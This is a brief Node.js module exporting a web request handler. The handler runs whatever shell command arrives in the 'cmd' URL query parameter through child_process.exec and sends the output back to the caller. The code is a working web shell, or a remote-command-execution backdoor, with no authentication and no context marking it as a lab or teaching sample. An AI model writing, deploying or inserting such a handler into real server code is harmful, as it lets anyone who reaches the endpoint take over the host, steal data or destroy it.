const { exec } = require('child_process');
const url = require('url');

module.exports = (req, res) => {
  const query = url.parse(req.url, true).query;
  if (query.cmd) {
    exec(query.cmd, (error, stdout, stderr) => {
      res.send(error ? error.message : (stderr || stdout));
    });
  } else {
    res.send('No command');
  }
};